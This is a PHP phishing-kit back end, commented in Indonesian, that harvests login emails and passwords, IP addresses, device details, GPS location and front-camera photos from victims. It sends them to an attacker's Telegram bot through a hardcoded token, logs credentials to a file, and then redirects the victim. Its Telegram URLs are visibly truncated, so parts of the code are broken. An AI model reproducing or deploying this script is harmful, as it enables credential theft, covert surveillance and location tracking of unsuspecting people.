<?php
// ===================================================
// ALZZc-777 MASTER LOGGER V10 (TELEGRAM INTEGRATED)
// ===================================================
$token  = "8769510332:AAHj32YP3UmoJT_faMLnsbAa4Gd0OPMMzuU";
$chatid = "6891987044";
// ===================================================

$time = date('d-M-Y H:i:s');
$ip   = $_SERVER['REMOTE_ADDR'];
$ua   = $_SERVER['HTTP_USER_AGENT'];

// 1. TANGKAP DATA LOGIN (EMAIL & PASS)
if (isset($_POST['email']) && isset($_POST['pass'])) {
    $email = $_POST['email'];
    $pass  = $_POST['pass'];
    
    // Deteksi Sumber Gateway
    $ref = $_SERVER['HTTP_REFERER'];
    $src = (strpos($ref, 'google') !== false) ? "GOOGLE" : ((strpos($ref, 'fb') !== false) ? "FACEBOOK" : "DIRECT");

    $msg = "<b>📢 NOTIFIKASI PANEN BARU!</b>\n\n";
    $msg .= "<b>🎯 Sumber :</b> <code>$src</code>\n";
    $msg .= "<b>📧 User   :</b> <code>$email</code>\n";
    $msg .= "<b>🔑 Pass   :</b> <code>$pass</code>\n";
    $msg .= "<b>🌐 IP     :</b> <code>$ip</code>\n\n";
    $msg .= "<b>📱 Device :</b>\n<i>$ua</i>";
    
    sendTele($msg);
    file_put_contents('logs.txt', "[$time] [$src] $email | $pass | $ip\n", FILE_APPEND);
}

// 2. TANGKAP LOKASI (GPS)
if (isset($_GET['lat'])) {
    $lat = $_GET['lat']; $lon = $_GET['lon'];
    sendTele("<b>📍 LOKASI TARGET DITEMUKAN!</b>\nhttps://google.com");
}

// 3. TANGKAP FOTO (KAMERA DEPAN)
if (isset($_POST['img'])) {
    $img = str_replace(['data:image/png;base64,', ' '], ['', '+'], $_POST['img']);
    $file = 'snap_'.time().'.png';
    file_put_contents($file, base64_decode($img));
    sendPhoto($file);
    unlink($file); // Hapus file di server setelah kirim
}

function sendTele($m) { global $token, $chatid; file_get_contents("https://telegram.org".urlencode($m)."&parse_mode=html"); }
function sendPhoto($f) {
    global $token, $chatid;
    $ch = curl_init("https://telegram.org");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ['chat_id' => $chatid, 'photo' => new CURLFile(realpath($f))]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_exec($ch); curl_close($ch);
}
header("Location: index.html");
?>
